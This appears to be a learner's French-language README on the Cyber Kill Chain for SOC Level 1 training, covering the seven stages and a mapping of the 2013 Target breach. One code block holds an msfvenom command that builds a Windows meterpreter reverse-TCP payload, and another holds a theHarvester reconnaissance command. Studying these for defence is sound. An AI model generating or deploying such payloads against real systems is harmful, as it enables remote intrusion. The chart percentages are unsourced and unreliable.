# Cyber-Kill-Chain soc level 1 
The Cyber Kill Chain framework is designed for identification and prevention of the network intrusions. You will learn what the adversaries need to do in order to achieve their goals.
<!-- SCREENSHOT 1 - HEADER -->
![Schéma de la Cyber Kill Chain](images/cyberkillchain.png)  
*Fig.1 - Les 7 étapes de la Cyber Kill Chain (Lockheed Martin)*

## 📌 Introduction
La **Cyber Kill Chain** est un modèle de sécurité qui décrit les étapes d'une cyberattaque. Voici sa décomposition complète :

## 🔍 Les 7 Étapes Clés

### 1. Reconnaissance (Espionnage)
- **Objectif** : Collecter des informations sur la cible
- **Outils** : 
  ```bash
  theHarvester -d entreprise.com -b google # 🔗 Cyber Kill Chain - SOC Level 1 Path

## 2. Weaponization (Armement)
**Définition** :  
Création de l'arme numérique combinant malware et exploit.

**Méthodes** :
- 💾 Documents avec macros malveillantes
- 📦 Exploits zero-day
- 🧩 Kits d'exploitation (Metasploit)

**Outils SOC** :
```bash
# Génération de payload détectable par les SOC
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > malware.exe

# Analyse statique avec FLOSS (SOC Level 1)
floss malware.exe > analysis_report.txt .## 3. Delivery (Livraison)
**Définition** :  
Transmission du payload malveillant à la cible.

**Méthodes courantes** :
```mermaid
pie title Méthodes de Livraison (2023)
    "Phishing" : 65
    "Sites compromis" : 20
    "USB malveillants" : 10
    "Autres" : 5.## 💥 Exploitation (Piratage)

### 🎯 C'est quoi ?
Le moment où le pirate **active son attaque** après être entré dans le système.

### 🔧 Comment ça marche ?
1. Le pirate utilise :
   - Un **lien piégé** (phishing)
   - Une **faille logicielle** (ex: CVE-2023-1234)
   - Une **macro Word** malveillante

2. Résultat :  
   ```text
   [Attaquant]$ Accès réussi !  .## 🔐 Installation (Persistance)

### 🎯 Définition
Phase où l'attaquant s'installe durablement dans le système.

### 🔧 Techniques Courantes
```mermaid
graph TD
    A[Accès initial] --> B[Backdoor]
    A --> C[Web Shell]
    A --> D[Services Windows].## 🕹️ Command & Control (C2)

### 🔌 Définition
Mécanisme permettant aux attaquants de **contrôler à distance** les machines compromises.

### 🌐 Protocoles C2 Courants
```mermaid
pie title Protocoles C2 (2023)
    "HTTPS" : 45
    "DNS" : 30
    "WebSockets" : 15
    "Autres" : 10.## 💰 Actions on Objectives (Exfiltration)

### 🎯 Définition
Phase finale où l'attaquant **réalise son objectif** (vol de données, sabotage, etc.).

### 📦 Méthodes d'Exfiltration
```mermaid
graph LR
    A[Data] -->|FTP| B(Server Attaquant)
    A -->|DNS| B
    A -->|Cloud Storage| B.## 🔍 Practice Analysis - Target Breach 2013

### 📸 Attack Flow Visualization
![Target Breach Kill Chain](images/target_attack.png)  
*Visual breakdown of the Target Corporation cyberattack*

### 🔗 Kill Chain Mapping
```mermaid
graph TD
    A[Recon: HVAC Vendor] --> B[Weapon: Malware]
    B --> C[Delivery: Vendor Portal]
    C --> D[Exploit: Credential Theft]
    D --> E[Lateral Movement]
    E --> F[POS Data Exfiltration].
